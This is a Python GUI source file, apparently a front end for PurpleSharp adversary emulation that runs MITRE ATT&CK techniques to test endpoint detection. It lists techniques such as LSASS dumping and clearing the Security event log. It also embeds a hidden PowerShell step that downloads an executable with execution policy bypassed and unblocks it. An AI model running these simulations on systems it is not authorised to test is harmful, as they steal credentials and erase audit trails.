import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import subprocess
import threading
import time
import webbrowser
import os
from pathlib import Path
import datetime
import json

class BadCipherEDRDemo:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Arcadian")
        self.root.geometry("1300x900")

        # --- Theme Definitions ---
        self.themes = {
            "Dark": {
                "root_bg": "#1c1c1c", "frame_bg": "#1c1c1c", "text_fg": "#a9a9a9",
                "title_fg": "#dcdcdc", "accent_fg": "#a9a9a9", "button_bg": "#333333",
                "button_active_bg": "#4f4f4f", "terminal_bg": "#0f0f0f", "font_family": "Consolas"
            },
            "Light": {
                "root_bg": "#f0f0f0", "frame_bg": "#f0f0f0", "text_fg": "#333333",
                "title_fg": "#005a9e", "accent_fg": "#0078d4", "button_bg": "#e1e1e1",
                "button_active_bg": "#cccccc", "terminal_bg": "#ffffff", "font_family": "Consolas"
            },
            "Terminal": {
                "root_bg": "#0a0a0a", "frame_bg": "#0a0a0a", "text_fg": "#00ff41",
                "title_fg": "#00ff41", "accent_fg": "#00ff41", "button_bg": "#1a1a1a",
                "button_active_bg": "#2a2a2a", "terminal_bg": "#000000", "font_family": "Consolas"
            }
        }
        self.current_theme_name = "Dark"
        self.theme_var = tk.StringVar(value=self.current_theme_name)
        
        self.current_view_factory = self.show_main_menu
        self.stop_operations = False
        self.main_frame = None
        self._terminal_content_backup = ""
        
        # --- State Variables ---
        self.simulation_running = False 
        
        # --- Paths and Settings ---
        self.app_data_path = Path(r"C:\Arcadian")
        self.custom_sims_path = self.app_data_path / "CustomSimulations"
        self.playbooks_path = self.app_data_path / "Playbooks"
        self.purplesharp_install_path = r"C:\PurpleSharp"
        self.purplesharp_exe_path = Path(self.purplesharp_install_path) / "PurpleSharp.exe"
        self.setup_app_directories() 

        # --- Test Data Loading ---
        self.all_tests = self.load_all_tests()
        
        self.apply_theme(self.current_theme_name)

    # --- SETUP & STYLING ---

    def setup_app_directories(self):
        """Creates directories for custom PurpleSharp content if they don't exist."""
        try:
            self.custom_sims_path.mkdir(parents=True, exist_ok=True)
            self.playbooks_path.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            messagebox.showerror("Directory Error", f"Could not create application directories in C:\\Arcadian.\n\nError: {e}")
            
    def apply_theme(self, theme_name):
        self.current_theme_name = theme_name
        self.theme_var.set(theme_name)
        
        terminal_to_check = getattr(self, 'ttp_terminal', None) or getattr(self, 'terminal_output', None)
        if terminal_to_check and terminal_to_check.winfo_exists():
            self._terminal_content_backup = terminal_to_check.get("1.0", tk.END)

        if self.main_frame:
            self.main_frame.destroy()

        theme = self.themes[theme_name]
        self.root.configure(bg=theme["root_bg"])
        self.setup_styles(theme)
        
        self.main_frame = ttk.Frame(self.root, style='TFrame')
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.current_view_factory()

    def setup_styles(self, theme):
        style = ttk.Style()
        try: style.theme_use('clam')
        except tk.TclError: pass

        font_family = theme["font_family"]
        
        style.configure('TFrame', background=theme["frame_bg"])
        style.configure('Title.TLabel', background=theme["frame_bg"], foreground=theme["title_fg"], font=(font_family, 12, 'bold'))
        style.configure('Subtitle.TLabel', background=theme["frame_bg"], foreground=theme["text_fg"], font=(font_family, 9))
        style.configure('TLabel', background=theme["frame_bg"], foreground=theme["text_fg"], font=(font_family, 9))
        style.configure('TEntry', fieldbackground=theme["terminal_bg"], foreground=theme["text_fg"], insertcolor=theme["title_fg"])
        
        style.configure('Theme.TRadiobutton', background=theme["frame_bg"], foreground=theme["text_fg"], font=(font_family, 8, 'bold'))
        style.map('Theme.TRadiobutton', foreground=[('active', theme["title_fg"])], background=[('active', theme["frame_bg"])])
                      
        style.configure('TNotebook', background=theme["button_bg"], borderwidth=1)
        style.configure('TNotebook.Tab', background=theme["button_bg"], foreground=theme["text_fg"], lightcolor=theme["frame_bg"], font=(font_family, 10, 'bold'))
        style.map('TNotebook.Tab', background=[('selected', theme["accent_fg"]), ('active', theme["button_active_bg"])], foreground=[('selected', theme["terminal_bg"]), ('active', theme["accent_fg"])])
        
        style.configure("Treeview", background=theme["terminal_bg"], foreground=theme["text_fg"], fieldbackground=theme["terminal_bg"], font=(font_family, 10))
        style.configure("Treeview.Heading", background=theme["button_bg"], foreground=theme["title_fg"], font=(font_family, 10, 'bold'), relief='flat')
        style.map("Treeview.Heading", background=[('active', theme["button_active_bg"])])
        style.configure("green.Horizontal.TProgressbar", background=theme["accent_fg"])

    def create_theme_selector(self, parent):
        selector_frame = ttk.Frame(parent, style='TFrame')
        selector_frame.pack(side=tk.BOTTOM, anchor='sw', padx=5, pady=5)
        lbl = ttk.Label(selector_frame, text="Theme:", style='Subtitle.TLabel')
        lbl.pack(side=tk.LEFT, padx=(0, 5))
        for theme_name_key in self.themes:
            rb = ttk.Radiobutton(selector_frame, text=theme_name_key, variable=self.theme_var, value=theme_name_key, command=lambda name=theme_name_key: self.apply_theme(name), style='Theme.TRadiobutton', cursor='hand2')
            rb.pack(side=tk.LEFT)

    def clear_frame(self):
        self.stop_operations = True
        for widget in self.main_frame.winfo_children():
            widget.destroy()
        self.root.after(100, lambda: setattr(self, 'stop_operations', False))

    def log_to_terminal(self, message, add_timestamp=True):
        def _log_message():
            try:
                terminal = getattr(self, 'ttp_terminal', None) or getattr(self, 'terminal_output', None)
                if terminal and terminal.winfo_exists():
                    if add_timestamp:
                        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
                        terminal.insert(tk.END, f"[{timestamp}] {message}\n")
                    else:
                        terminal.insert(tk.END, f"{message}\n")
                    terminal.see(tk.END)
            except (tk.TclError, AttributeError): pass
        
        if hasattr(self, 'root') and self.root.winfo_exists():
            self.root.after(0, _log_message)

    # --- MAIN MENU ---

    def show_main_menu(self):
        self.current_view_factory = self.show_main_menu
        self.clear_frame()
        theme = self.themes[self.current_theme_name]
        
        content_frame = ttk.Frame(self.main_frame, style='TFrame')
        content_frame.pack(fill=tk.BOTH, expand=True)

        ascii_art = r"""
                             _ _             
     /\                     | (_)            
    /  \   _ __ ___ __ _  __| |_  __ _ _ __  
   / /\ \ | '__/ __/ _` |/ _` | |/ _` | '_ \ 
  / ____ \| | | (_| (_| | (_| | | (_| | | | |
 /_/    \_\_|  \___\__,_|\__,_|_|\__,_|_| |_|
                                             
       / \      _-'
     _/|  \-''- _ /
__-' { |          \
    /             \
    /       "o.  |o }
    |            \ ;
                  ',
       \_         __\
         ''-_    \.//
           / '-____'
          /
        _'
      _-'
"""
        container = ttk.Frame(content_frame, style='TFrame')
        container.pack(expand=True, fill=tk.BOTH)

        ascii_label = tk.Label(container, text=ascii_art, bg=theme["frame_bg"], fg=theme["title_fg"], font=(theme["font_family"], 10, 'bold'), justify=tk.CENTER)
        ascii_label.pack(pady=(20, 10))
        
        subtitle = ttk.Label(container, text="⚡ Advanced Threat Simulation Platform ⚡", style='Subtitle.TLabel')
        subtitle.pack(pady=(0, 20))

        button_frame = ttk.Frame(container, style='TFrame')
        button_frame.pack(expand=True)

        def create_styled_button(parent, text, command):
            return tk.Button(parent, text=text, command=command, bg=theme["button_bg"], fg=theme["accent_fg"], activebackground=theme["button_active_bg"], activeforeground=theme["accent_fg"], font=(theme["font_family"], 10, 'bold'), relief='raised', bd=2, width=35, height=2, cursor='hand2')
        
        purplesharp_btn = create_styled_button(button_frame, "🟪 Simulate MITRE TTPs", self.show_ttp_executor_page)
        purplesharp_btn.pack(pady=8)
        
        playbook_manager_btn = create_styled_button(button_frame, "📚 Attack Chain Manager", self.show_playbook_manager)
        playbook_manager_btn.pack(pady=8)

        # --- NEW THREAT ACTOR BUTTON ---
        ta_sim_btn = create_styled_button(button_frame, "🎭 Simulate Threat Actor", self.show_ta_simulation_menu)
        ta_sim_btn.pack(pady=8)
        
        builder_btn = create_styled_button(button_frame, "🛠️ Custom Simulation Builder", self.show_simulation_builder)
        builder_btn.pack(pady=8)
        
        malware_btn = create_styled_button(button_frame, "💀 Malware testing", self.show_malware_browser)
        malware_btn.pack(pady=8)

        exit_btn = create_styled_button(button_frame, "🚪 Exit Application", self.root.quit)
        exit_btn.pack(pady=8)

        footer = ttk.Label(container, text="⚠️   FOR AUTHORIZED TESTING PURPOSES ONLY   ⚠️", style='Subtitle.TLabel')
        footer.pack(side=tk.BOTTOM, pady=20)
        
        self.create_theme_selector(self.main_frame)

    # --- DATA LOADING & MANAGEMENT ---
    
    def load_all_tests(self):
        """Loads built-in PurpleSharp tests and custom-defined simulations."""
        tests = {
            "Execution": {
                "T1059.001": {"name": "Command and Scripting Interpreter: PowerShell", "desc": "Executes a PowerShell commandlet using CreateProcess or the .NET Automation namespace."},
                "T1059.003": {"name": "Command and Scripting Interpreter: Windows Command Shell", "desc": "Executes a command using 'cmd.exe /c'."},
                "T1059.005": {"name": "Command and Scripting Interpreter: Visual Basic", "desc": "Executes a local VBS file using 'wscript.exe'."},
                "T1059.007": {"name": "Command and Scripting Interpreter: JavaScript/JScript", "desc": "Executes a local JS file using 'wscript.exe'."},
                "T1053.005": {"name": "Scheduled Task/Job: Scheduled Task", "desc": "Creates a daily scheduled task using 'SCHTASKS.exe'."},
                "T1569.002": {"name": "System Services: Service Execution", "desc": "Starts a specified Windows service using 'net start'."},
            },
            "Persistence": {
                "T1136.001": {"name": "Create Account: Local Account", "desc": "Creates a local user account using the NetUserAdd API or the 'net user' command."},
                "T1543.003": {"name": "Create or Modify System Process: Windows Service", "desc": "Creates a Windows Service using the CreateService API or 'sc.exe create'."},
                "T1547.001": {"name": "Boot or Logon Autostart Execution: Registry Run Keys", "desc": "Creates a persistence registry key in HKCU...\\Run using .NET or 'reg add'."},
                "T1546.003": {"name": "Event Triggered Execution: WMI Event Subscription", "desc": "Creates a WMI Event Subscription (Filter, Consumer, Binding) using .NET."},
            },
            "Defense Evasion": {
                "T1055.002": {"name": "Process Injection: Portable Executable Injection", "desc": "Injects shellcode into a remote process using CreateRemoteThread."},
                "T1055.004": {"name": "Process Injection: Asynchronous Procedure Call", "desc": "Injects shellcode into a remote process using QueueUserAPC."},
                "T1220": {"name": "XSL Script Processing", "desc": "Executes a remote XSL script using 'wmic.exe os get /FORMAT'."},
                "T1070.001": {"name": "Clear Windows Event Logs", "desc": "Clears the Security Event Log using 'wevtutil.exe cl Security' or .NET APIs."},
                "T1218.011": {"name": "Signed Binary Proxy Execution: Rundll32", "desc": "Executes a payload via 'rundll32.exe'."},
            },
            "Credential Access": {
                "T1110.003": {"name": "Brute Force: Password Spraying", "desc": "Tests a single password against multiple users via LogonUser or WNetAddConnection2 APIs."},
                "T1558.003": {"name": "Steal or Forge Kerberos Tickets: Kerberoasting", "desc": "Requests Kerberos service tickets for offline cracking."},
                "T1003.001": {"name": "OS Credential Dumping: LSASS Memory", "desc": "Creates a memory dump of the lsass.exe process using MiniDumpWriteDump."},
            },
            "Discovery": {
                "T1049": {"name": "System Network Connections Discovery", "desc": "Discovers network connections and sessions using 'netstat.exe' and 'net.exe'."},
                "T1033": {"name": "System Owner/User Discovery", "desc": "Discovers logged-on users using 'whoami.exe' and 'query user'."},
                "T1007": {"name": "System Service Discovery", "desc": "Discovers system services using 'net.exe start' and 'tasklist.exe /svc'."},
            },
            "Lateral Movement": {
                "T1021.006": {"name": "Remote Services: Windows Remote Management", "desc": "Executes commands on remote hosts using WinRM and the .NET namespace."},
            }
        }
        
        custom_tactic = "Custom Simulations"
        tests[custom_tactic] = {}
        if self.custom_sims_path.exists():
            for file_path in self.custom_sims_path.glob("*.json"):
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        sim_data = json.load(f)
                        tests[custom_tactic][sim_data['id']] = {
                            "name": sim_data['name'],
                            "desc": sim_data['description'],
                            "data": sim_data
                        }
                except Exception as e:
                    print(f"Error loading custom sim {file_path.name}: {e}")
        return tests

    def _delete_custom_test(self, ttp_id):
        """Core logic to delete a custom test file."""
        if not ttp_id.startswith("CUSTOM-"):
            messagebox.showwarning("Cannot Delete", "Only tests in 'Custom Simulations' can be deleted.")
            return False

        if not messagebox.askyesno("Confirm Deletion", f"Are you sure you want to permanently delete the test '{ttp_id}'?"):
            return False

        try:
            file_to_delete = self.custom_sims_path / f"{ttp_id}.json"
            if file_to_delete.exists():
                file_to_delete.unlink()
                messagebox.showinfo("Success", f"Test '{ttp_id}' has been deleted.")
                return True
            else:
                messagebox.showerror("Error", f"Could not find the file for test '{ttp_id}'. It may have already been deleted.")
                return False
        except Exception as e:
            messagebox.showerror("Deletion Failed", f"An error occurred while deleting the test file:\n{e}")
            return False

    # --- WOLF GAUNTLET (TTP EXECUTOR) MODULE ---

    def show_ttp_executor_page(self):
        self.current_view_factory = self.show_ttp_executor_page
        self.clear_frame()
        self.terminal_output = None 
        
        theme = self.themes[self.current_theme_name]
        title = ttk.Label(self.main_frame, text="🟪 Wolf Gauntlet - Individual Test Runner", style='Title.TLabel')
        title.pack(pady=10, fill=tk.X)
        
        self.all_tests = self.load_all_tests()
        
        if self.purplesharp_exe_path.exists():
            self.draw_ttp_executor_ui(self.main_frame)
        else:
            self.draw_ttp_setup_ui(self.main_frame)
            threading.Thread(target=self._setup_purplesharp_thread, daemon=True).start()
            
        back_btn = tk.Button(self.main_frame, text="🔙 Back to Main Menu", command=self.show_main_menu, bg=theme["button_bg"], fg=theme["accent_fg"], activebackground=theme["button_active_bg"], activeforeground=theme["accent_fg"], font=(theme["font_family"], 9, 'bold'), relief='raised', bd=2, cursor='hand2')
        back_btn.pack(side=tk.BOTTOM, anchor='se', padx=10, pady=10)
        self.create_theme_selector(self.main_frame)
    
    def draw_ttp_setup_ui(self, parent):
        theme = self.themes[self.current_theme_name]
        self.setup_frame = ttk.Frame(parent, style='TFrame')
        self.setup_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        ttk.Label(self.setup_frame, text="First-Time Setup: Preparing PurpleSharp...", style='Title.TLabel', font=(theme["font_family"], 14, 'bold')).pack(pady=20)
        ttk.Label(self.setup_frame, text="This may take a minute. Please wait while PurpleSharp is installed automatically.", style='Subtitle.TLabel').pack(pady=5)
        self.progressbar = ttk.Progressbar(self.setup_frame, mode='indeterminate', style="green.Horizontal.TProgressbar")
        self.progressbar.pack(fill=tk.X, padx=50, pady=20)
        self.progressbar.start(10)
        terminal_frame = ttk.Frame(self.setup_frame, style='TFrame')
        terminal_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        ttk.Label(terminal_frame, text="Installation Progress:", style="Subtitle.TLabel").pack(anchor='w')
        self.ttp_terminal = scrolledtext.ScrolledText(terminal_frame, bg=theme["terminal_bg"], fg=theme["text_fg"], font=(theme["font_family"], 9), relief=tk.FLAT)
        self.ttp_terminal.pack(fill=tk.BOTH, expand=True)

    def _setup_purplesharp_thread(self):
        self.log_to_terminal("[SETUP] Starting PurpleSharp autonomous setup...")
        setup_script = fr"""
        $ErrorActionPreference = 'Stop'
        $installPath = "{self.purplesharp_install_path}"
        $exePath = "{self.purplesharp_exe_path}"
        try {{
            if (Test-Path $exePath) {{ Write-Host "[SUCCESS] PurpleSharp.exe already found."; exit 0 }}
            if (-not (Test-Path $installPath)) {{ Write-Host "[ACTION] Creating installation directory..."; New-Item -Path $installPath -ItemType Directory -Force | Out-Null }}
            Write-Host "[ACTION] Downloading PurpleSharp v1.3...";
            $client = New-Object System.Net.WebClient
            $url = "https://github.com/mvelazc0/PurpleSharp/releases/download/v1.3/PurpleSharp_x64.exe"
            $client.DownloadFile($url, $exePath)
            if (Test-Path $exePath) {{
                Write-Host "[SUCCESS] Download complete."; Write-Host "[ACTION] Unblocking file..."; Unblock-File -Path $exePath;
                Write-Host "[SUCCESS] Setup finished successfully!"; exit 0;
            }} else {{ Write-Host "[FATAL ERROR] File download failed."; exit 1; }}
        }} catch {{ Write-Host "[FATAL ERROR] An error occurred: $($_.Exception.Message)"; exit 1; }}
        """
        try:
            command = ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", setup_script]
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            for line in iter(process.stdout.readline, ''): self.log_to_terminal(line.strip())
            process.stdout.close(); process.wait()
        except Exception as e:
            self.log_to_terminal(f"[CRITICAL ERROR] Could not execute setup script: {e}")
        self.root.after(0, self.on_ttp_setup_complete)

    def on_ttp_setup_complete(self):
        if hasattr(self, 'progressbar'): self.progressbar.stop()
        theme = self.themes[self.current_theme_name]
        if self.purplesharp_exe_path.exists():
            if hasattr(self, 'setup_frame') and self.setup_frame.winfo_exists():
                self.setup_frame.destroy()
            self.draw_ttp_executor_ui(self.main_frame)
        else:
            if hasattr(self, 'progressbar') and self.progressbar.winfo_exists(): self.progressbar.pack_forget()
            ttk.Label(self.setup_frame, text="Setup Failed.", foreground="red", background=theme["frame_bg"]).pack(pady=10)
            retry_btn = tk.Button(self.setup_frame, text="🔄 Retry Setup", command=self.show_ttp_executor_page, bg=theme["button_bg"], fg=theme["accent_fg"])
            retry_btn.pack(pady=20)

    def draw_ttp_executor_ui(self, parent):
        theme = self.themes[self.current_theme_name]
        main_pane = tk.PanedWindow(parent, orient=tk.HORIZONTAL, bg=theme["frame_bg"], sashwidth=8, sashrelief=tk.RAISED)
        main_pane.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        left_pane = ttk.Frame(main_pane, style='TFrame')
        tree_frame = ttk.Frame(left_pane)
        tree_frame.pack(fill=tk.BOTH, expand=True)
        self.ttp_tree = ttk.Treeview(tree_frame, columns=("ID",), style="Treeview")
        self.ttp_tree.heading("#0", text="Tactic / Technique")
        self.ttp_tree.heading("ID", text="Test ID")
        self.ttp_tree.column("ID", width=150, anchor='w')
        
        for tactic, techniques in self.all_tests.items():
            tactic_id = self.ttp_tree.insert("", "end", text=tactic, open=True, tags=('tactic',))
            for ttp_id, details in techniques.items():
                tag = 'custom' if ttp_id.startswith("CUSTOM-") else 'builtin'
                self.ttp_tree.insert(tactic_id, "end", text=details['name'], values=(ttp_id,), iid=ttp_id, tags=(tag,))
        
        self.ttp_tree.tag_configure('tactic', foreground=theme['title_fg'])
        self.ttp_tree.tag_configure('custom', foreground=theme['accent_fg'])

        self.ttp_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        tree_scroll = ttk.Scrollbar(tree_frame, orient="vertical", command=self.ttp_tree.yview)
        tree_scroll.pack(side=tk.RIGHT, fill="y")
        self.ttp_tree.configure(yscrollcommand=tree_scroll.set)
        main_pane.add(left_pane, width=450)

        right_pane = ttk.Frame(main_pane, style='TFrame')
        details_frame = ttk.Frame(right_pane, style='TFrame')
        details_frame.pack(fill=tk.X, pady=(0,10))
        
        self.ttp_details_text = scrolledtext.ScrolledText(details_frame, height=6, bg=theme["terminal_bg"], fg=theme["text_fg"], font=(theme["font_family"], 9), relief=tk.FLAT)
        self.ttp_details_text.pack(fill=tk.X, expand=True, padx=5)
        self.ttp_details_text.insert(tk.END, "Select a test from the list on the left to see details.")
        self.ttp_details_text.config(state=tk.DISABLED)

        button_frame = ttk.Frame(details_frame, style='TFrame')
        button_frame.pack(pady=10)
        
        self.execute_ttp_btn = tk.Button(button_frame, text="💥 Execute", command=self.execute_ttp_test, state=tk.DISABLED, bg=theme["button_bg"], fg=theme["accent_fg"], cursor='hand2')
        self.execute_ttp_btn.pack(side=tk.LEFT, padx=5)
        
        self.cancel_ttp_btn = tk.Button(button_frame, text="🛑 Cancel", command=self.cancel_ttp_test, state=tk.DISABLED, bg=theme["button_bg"], fg=theme["accent_fg"], cursor='hand2')
        self.cancel_ttp_btn.pack(side=tk.LEFT, padx=5)

        self.clear_terminal_btn = tk.Button(button_frame, text="🧹 Clear", command=self.clear_terminal, state=tk.NORMAL, bg=theme["button_bg"], fg=theme["accent_fg"], cursor='hand2')
        self.clear_terminal_btn.pack(side=tk.LEFT, padx=5)
        
        self.delete_ttp_btn = tk.Button(button_frame, text="🗑️ Delete Test", command=self.delete_ttp_view_test, state=tk.DISABLED, bg=theme["button_bg"], fg=theme["accent_fg"], cursor='hand2')
        self.delete_ttp_btn.pack(side=tk.LEFT, padx=5)
        
        self.ttp_tree.bind("<<TreeviewSelect>>", self.on_ttp_test_select)
        
        terminal_frame = ttk.Frame(right_pane, style='TFrame')
        terminal_frame.pack(fill=tk.BOTH, expand=True, padx=5)
        ttk.Label(terminal_frame, text="Execution Output:", style="Subtitle.TLabel").pack(anchor='w')
        self.ttp_terminal = scrolledtext.ScrolledText(terminal_frame, bg=theme["terminal_bg"], fg=theme["accent_fg"], font=(theme["font_family"], 9), relief=tk.FLAT)
        self.ttp_terminal.pack(fill=tk.BOTH, expand=True)
        main_pane.add(right_pane)

    def on_ttp_test_select(self, event):
        selection = self.ttp_tree.selection()
        if not selection: return
        selected_id = selection[0]
        
        is_valid_test = self.ttp_tree.parent(selected_id)
        if is_valid_test and not self.simulation_running:
            self.execute_ttp_btn.config(state=tk.NORMAL)
        else:
            self.execute_ttp_btn.config(state=tk.DISABLED)

        is_custom_test = 'custom' in self.ttp_tree.item(selected_id, 'tags')
        if is_custom_test and not self.simulation_running:
             self.delete_ttp_btn.config(state=tk.NORMAL)
        else:
             self.delete_ttp_btn.config(state=tk.DISABLED)

        if is_valid_test:
            test_details = None
            for _, techniques in self.all_tests.items():
                if selected_id in techniques:
                    test_details = techniques[selected_id]
                    break
            if test_details:
                self.ttp_details_text.config(state=tk.NORMAL)
                self.ttp_details_text.delete(1.0, tk.END)
                self.ttp_details_text.insert(tk.END, f"ID: {selected_id}\nName: {test_details['name']}\n\nDescription:\n{test_details['desc']}")
                self.ttp_details_text.config(state=tk.DISABLED)
        else:
             self.ttp_details_text.config(state=tk.NORMAL)
             self.ttp_details_text.delete(1.0, tk.END)
             self.ttp_details_text.insert(tk.END, "Select a specific test to see its details.")
             self.ttp_details_text.config(state=tk.DISABLED)

    def delete_ttp_view_test(self):
        """Command for the delete button in the TTP Executor view."""
        selection = self.ttp_tree.selection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a custom test to delete.")
            return
        
        ttp_id = selection[0]
        if self._delete_custom_test(ttp_id):
            self.show_ttp_executor_page()

    def cancel_ttp_test(self):
        if self.simulation_running:
            self.log_to_terminal("🛑 CANCEL request received. Halting after current step...")
            self.stop_operations = True
            
    def execute_ttp_test(self):
        if self.simulation_running:
            messagebox.showwarning("Busy", "A simulation is already running.")
            return
        selection = self.ttp_tree.selection()
        if not selection or not self.ttp_tree.parent(selection[0]):
            messagebox.showwarning("No Test Selected", "Please select a specific test from the tree.")
            return
        
        ttp_id = selection[0]
        self.simulation_running = True
        self.stop_operations = False
        self.execute_ttp_btn.config(state=tk.DISABLED)
        self.delete_ttp_btn.config(state=tk.DISABLED)
        self.cancel_ttp_btn.config(state=tk.NORMAL)
        self.log_to_terminal(f"--- QUEUING EXECUTION FOR {ttp_id} ---")
        threading.Thread(target=self._execute_test_thread, args=(ttp_id,), daemon=True).start()

    def _execute_test_thread(self, ttp_id):
        if ttp_id.startswith("CUSTOM-"):
            self._execute_custom_simulation_thread(ttp_id)
        else:
            self._execute_purplesharp_simulation_thread(ttp_id)
        
        def on_finish():
            self.simulation_running = False
            self.on_ttp_test_select(None)
            if hasattr(self, 'cancel_ttp_btn') and self.cancel_ttp_btn.winfo_exists():
                self.cancel_ttp_btn.config(state=tk.DISABLED)
            self.log_to_terminal("--- EXECUTION FINISHED ---")
            
        if hasattr(self, 'root') and self.root.winfo_exists():
            self.root.after(0, on_finish)

    def _execute_purplesharp_simulation_thread(self, ttp_id):
        self.log_to_terminal(f"\n{'='*80}\n🔬 EXECUTING ARCADIAN TEST: {ttp_id}\n{'='*80}")
        
        def run_ps_command(command_args, phase_name):
            if self.stop_operations: return
            self.log_to_terminal(f"--- {phase_name} Phase ---", add_timestamp=False)
            try:
                command = [str(self.purplesharp_exe_path)] + command_args
                self.log_to_terminal(f"Running command: {' '.join(command)}")
                process = subprocess.Popen(
                    command,
                    cwd=self.purplesharp_install_path,
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, encoding='utf-8', errors='ignore',
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                for line in iter(process.stdout.readline, ''):
                    if self.stop_operations:
                        subprocess.call(['taskkill', '/F', '/T', '/PID', str(process.pid)])
                        break
                    self.log_to_terminal(line.strip(), add_timestamp=False)
                process.wait()
                self.log_to_terminal(f"Phase complete with return code: {process.returncode}")
            except FileNotFoundError:
                self.log_to_terminal(f"ERROR: Could not find PurpleSharp.exe at '{self.purplesharp_exe_path}'")
            except Exception as e:
                self.log_to_terminal(f"ERROR during PurpleSharp execution: {e}")

        run_ps_command(["/t", ttp_id], "Simulation")
        time.sleep(1)
        if not self.stop_operations:
            run_ps_command(["/c"], "Cleanup")
        
        self.log_to_terminal(f"✅ ARCADIAN TEST FINISHED: {ttp_id}")

    # --- SIMULATION & PLAYBOOK EXECUTION ---

    def _run_custom_script(self, shell_type, script_content, log_prefix):
        """Executes a script using either PowerShell or CMD."""
        if self.stop_operations: return
        self.log_to_terminal(f"--- Running {log_prefix} Script ({shell_type.upper()}) ---", add_timestamp=False)
        had_output = False
        
        try:
            if shell_type == 'powershell':
                command = ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script_content]
            elif shell_type == 'cmd':
                command = ["cmd.exe", "/c", script_content]
            else:
                self.log_to_terminal(f"ERROR: Unknown shell type '{shell_type}'. Aborting.", add_timestamp=False)
                return

            process = subprocess.Popen(
                command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, encoding='utf-8', errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW
            )
            for line in iter(process.stdout.readline, ''):
                if self.stop_operations: 
                    subprocess.call(['taskkill', '/F', '/T', '/PID', str(process.pid)])
                    break
                had_output = True
                self.log_to_terminal(line.strip(), add_timestamp=False)
            process.wait()
        except Exception as e:
            self.log_to_terminal(f"ERROR running script: {e}", add_timestamp=False)
        
        if not had_output and not self.stop_operations:
            self.log_to_terminal("[INFO] Script completed with no output.", add_timestamp=False)
        self.log_to_terminal(f"--- End of {log_prefix} Script ---\n", add_timestamp=False)

    def _execute_custom_simulation_thread(self, ttp_id):
        self.log_to_terminal(f"\n{'='*80}\n🔬 EXECUTING CUSTOM SIMULATION: {ttp_id}\n{'='*80}")
        sim_data = None
        for tech in self.all_tests.get("Custom Simulations", {}).values():
            if tech.get('data', {}).get('id') == ttp_id:
                sim_data = tech['data']
                break
        if not sim_data:
            self.log_to_terminal(f"ERROR: Could not find data for custom simulation {ttp_id}"); return

        shell = sim_data.get('shell_type', 'powershell')

        self._run_custom_script(shell, sim_data.get('simulation_script', '# No simulation script provided'), "Simulation")
        time.sleep(1)
        if not self.stop_operations:
            self._run_custom_script(shell, sim_data.get('cleanup_script', '# No cleanup script provided'), "Cleanup")
        self.log_to_terminal(f"✅ CUSTOM SIMULATION FINISHED: {ttp_id}")

    def _execute_playbook_thread(self, steps):
        self.log_to_terminal(f"▶️ STARTING PLAYBOOK with {len(steps)} steps...")
        self.simulation_running = True
        self.stop_operations = False
        
        if hasattr(self, 'playbook_back_btn'):
            self.playbook_back_btn.config(state=tk.DISABLED)

        for i, ttp_id in enumerate(steps, 1):
            if self.stop_operations:
                self.log_to_terminal("🛑 Playbook execution cancelled by user.")
                break
            
            self.log_to_terminal(f"\n--- PLAYBOOK STEP {i} of {len(steps)} ---")
            
            if ttp_id.startswith("CUSTOM-"):
                self._execute_custom_simulation_thread(ttp_id)
            else:
                self._execute_purplesharp_simulation_thread(ttp_id)
            
            time.sleep(2)

        self.log_to_terminal("\n✅ PLAYBOOK EXECUTION COMPLETE.")
        self.simulation_running = False
        
        if hasattr(self, 'playbook_back_btn') and self.playbook_back_btn.winfo_exists():
            self.playbook_back_btn.config(state=tk.NORMAL)

    def show_playbook_execution_terminal_view(self, title_text, steps, back_command):
        """Displays a terminal for playbook execution."""
        self.current_view_factory = lambda: self.show_playbook_execution_terminal_view(title_text, steps, back_command)
        self.clear_frame()
        self.terminal_output = None 

        theme = self.themes[self.current_theme_name]
        ttk.Label(self.main_frame, text=title_text, style='Title.TLabel').pack(pady=10)
        
        self.ttp_terminal = scrolledtext.ScrolledText(self.main_frame, bg=theme["terminal_bg"], fg=theme["accent_fg"])
        self.ttp_terminal.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        button_bar = ttk.Frame(self.main_frame)
        button_bar.pack(fill=tk.X, side=tk.BOTTOM, pady=10, padx=10)
        
        self.playbook_back_btn = tk.Button(button_bar, text="🔙 Back", command=back_command, bg=theme["button_bg"], fg=theme["accent_fg"], cursor='hand2')
        self.playbook_back_btn.pack(side=tk.RIGHT)

        cancel_btn = tk.Button(button_bar, text="🛑 Cancel Execution", command=self.cancel_ttp_test, bg=theme["button_bg"], fg=theme["accent_fg"], cursor='hand2')
        cancel_btn.pack(side=tk.RIGHT, padx=10)

        threading.Thread(target=self._execute_playbook_thread, args=(steps,), daemon=True).start()

    # --- CUSTOM SIMULATION BUILDER ---

    def show_simulation_builder(self, sim_id_to_edit=None):
        self.current_view_factory = lambda: self.show_simulation_builder(sim_id_to_edit)
        self.clear_frame()
        theme = self.themes[self.current_theme_name]

        title_text = "Edit Custom Simulation" if sim_id_to_edit else "Create New Custom Simulation"
        ttk.Label(self.main_frame, text=f"🛠️ {title_text}", style='Title.TLabel').pack(pady=10)
        
        form_frame = ttk.Frame(self.main_frame)
        form_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

        fields = ["ID", "Name", "Tactic", "Description"]
        entries = {}
        for i, field in enumerate(fields):
            ttk.Label(form_frame, text=f"{field}:").grid(row=i, column=0, sticky='ne', pady=5, padx=5)
